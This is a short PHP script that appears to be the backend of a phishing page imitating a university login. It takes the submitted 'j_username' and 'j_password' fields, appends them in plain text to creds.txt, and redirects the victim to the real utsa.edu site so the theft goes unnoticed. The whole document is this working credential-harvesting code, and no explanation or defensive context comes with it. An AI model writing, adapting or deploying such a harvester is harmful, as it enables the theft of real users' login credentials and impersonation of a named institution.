<?php
 $username = $_POST['j_username'];
 $password = $_POST['j_password'];
 $myfile = fopen("creds.txt", "a") or die("Unable to open file!");
 fwrite($myfile, $username." ,".$password."\n");
 fclose($myfile);
 header("Location: https://utsa.edu");
?>